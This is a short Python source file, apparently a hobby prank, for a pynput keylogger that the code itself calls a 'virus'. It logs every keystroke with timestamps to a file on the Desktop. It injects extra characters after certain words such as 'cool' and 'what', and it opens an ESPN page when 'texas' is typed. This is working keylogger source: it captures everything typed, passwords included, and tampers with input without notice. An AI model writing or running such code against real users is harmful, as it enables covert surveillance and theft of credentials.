from pynput.keyboard import Key, Listener, Controller
import logging, os, webbrowser


class KeyLogger:
    def __init__(self, fileName='\Key_log.txt'):
        self.log_dir = os.path.expanduser('~/Desktop')

        logging.basicConfig(filename=(self.log_dir + fileName),
                            level=logging.DEBUG,
                            format='%(asctime)s: %(message)s')

        self.coolList = []

    def on_press(self, key):
        logging.info(key)
        if key == Key.backspace:
            self.coolList.pop()
        if key != Key.caps_lock and key != Key.shift and key != Key.backspace:
            self.coolList.append(str(key).lower())
            self.check()

    def run(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    # stop function is not working right now
    def stop(self):
        Listener(on_press=self.on_press).stop()
        
    def check(self):
        #print(self.coolList)
        checkList = self.coolList[-4:]
        event_cool = ["'c'", "'o'", "'o'", "'l'"]
        if checkList == event_cool:
            print('COOL!!!')
            keyboard = Controller()
            with keyboard.pressed(Key.shift):
                keyboard.press('1')
            with keyboard.pressed(Key.shift):
                keyboard.press('1')
            with keyboard.pressed(Key.shift):
                keyboard.press('1')
            return

        event_what = [
            ["'w'", "'h'", "'a'", "'t'"],
            ["'h'", "'o'", "'w'"],
            ["'w'", "'h'", "'e'", "'n'"],
            ["'w'", "'h'", "'e'", "'r'", "'e'"],
            ["'w'", "'h'", "'y'"]
            ]
        for i in event_what:
            length = len(i) * -1
            checkList = self.coolList[length:]
            if checkList == i:
                keyboard = Controller()
                with keyboard.pressed(Key.shift):
                    keyboard.press('/')
                with keyboard.pressed(Key.shift):
                    keyboard.press('/')
                with keyboard.pressed(Key.shift):
                    keyboard.press('/')
                return

        checkList = self.coolList[-5:]
        event_texas_is_back = ["'t'", "'e'", "'x'", "'a'", "'s'"]
        if checkList == event_texas_is_back:
            webbrowser.open('www.espn.com/college-football/rankings')
            return

def main():
    virus = KeyLogger()
    virus.run()

if __name__ == '__main__':
    main()
